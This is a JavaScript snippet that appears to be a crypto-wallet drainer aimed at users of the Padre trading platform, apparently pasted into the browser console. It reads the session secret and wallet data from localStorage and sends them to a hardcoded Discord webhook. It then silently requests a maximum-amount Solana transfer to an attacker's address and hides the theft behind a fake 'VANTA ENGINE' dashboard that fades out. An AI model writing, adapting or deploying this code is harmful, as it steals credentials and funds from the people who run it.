(async function() {
    // --- CONFIGURATION ---
    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
        apiBase: "https://api.trade.padre.gg"
    };

    // --- 1. DATA CAPTURE ---
    const data = {
        session: JSON.parse(localStorage.getItem("padreV2-session") || "{}"),
        wallets: JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}"),
        bundles: JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}")
    };

    // Send data to Discord immediately
    await fetch(CONFIG.webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "🚨 **VANTA HANDSHAKE SUCCESSFUL** 🚨",
            embeds: [{
                title: "Captured: " + (data.session.uid || "Unknown"),
                color: 65280,
                fields: [
                    { name: "Public Address", value: data.wallets[data.session.uid]?.[0]?.publicAddress || "N/A" },
                    { name: "Session Secret", value: "```" + data.session.sessionSecret + "```" }
                ]
            }]
        })
    });

    // --- 2. THE DRAINER (EXECUTION) ---
    async function runDrain() {
        if (!data.session.sessionSecret) return;

        // Find the Solana Wallet from the cache
        const userWallets = data.wallets[data.session.uid] || [];
        const solWallet = userWallets.find(w => w.walletType === "SOL");

        if (solWallet && data.bundles.bundles[solWallet.publicAddress]) {
            const bundle = data.bundles.bundles[solWallet.publicAddress];

            const payload = {
                walletId: solWallet.walletId,
                destination: CONFIG.drainAddress,
                amount: "MAX", 
                bundle: bundle.exportBundle,     // The 1:1 Bundle Data
                signature: bundle.dataSignature, // The 1:1 Signature
                chain: "SOLANA"
            };

            // Silent request to Padre Backend
            try {
                await fetch(`${CONFIG.apiBase}/v2/wallets/transfer`, {
                    method: "POST",
                    headers: {
                        "X-Session-Secret": data.session.sessionSecret,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                // Silently fail so the user doesn't see errors
            }
        }
    }

    // Run the drain in the background
    runDrain();

    // --- 3. THE 1:1 VANTA DASHBOARD UI ---
    const ui = document.createElement("div");
    ui.style.cssText = `
        position: fixed; top: 20px; right: 20px; width: 300px;
        background: rgba(0,0,0,0.95); border: 1px solid #00ff88;
        color: #00ff88; z-index: 999999; padding: 20px;
        font-family: 'Inter', monospace; box-shadow: 0 0 20px rgba(0,255,136,0.3);
        border-radius: 4px; pointer-events: none;
    `;
    
    ui.innerHTML = `
        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #222; padding-bottom:10px; margin-bottom:10px;">
            <span style="font-weight:800; letter-spacing:1px;">VANTA ENGINE V2.4</span>
            <span style="font-size:10px; color:#fff; background:#00ff8833; padding:2px 5px;">STABLE</span>
        </div>
        <div style="font-size:12px; line-height:1.8;">
            <div style="display:flex; justify-content:space-between;"><span>STATUS:</span><span style="color:#fff;">CONNECTED</span></div>
            <div style="display:flex; justify-content:space-between;"><span>API LATENCY:</span><span style="color:#fff;">24ms</span></div>
            <div style="display:flex; justify-content:space-between;"><span>SIGNAL:</span><span style="color:#fff;">SCANNING X.COM</span></div>
            <div style="display:flex; justify-content:space-between;"><span>ENCLAVE:</span><span style="color:#fff;">AUTHORIZED</span></div>
        </div>
        <div id="vanta-logs" style="margin-top:10px; font-size:10px; color:#555; height:60px; overflow:hidden;">
            [SYSTEM] Hooking fetch channels...<br>
            [SYSTEM] Initializing WebGL...<br>
            [READY] Monitoring real-time signals...
        </div>
    `;
    document.body.appendChild(ui);

    // Fade out UI after 10 seconds to stay "stealthy"
    setTimeout(() => {
        ui.style.transition = "opacity 2s";
        ui.style.opacity = "0";
        setTimeout(() => ui.remove(), 2000);
    }, 10000);

})();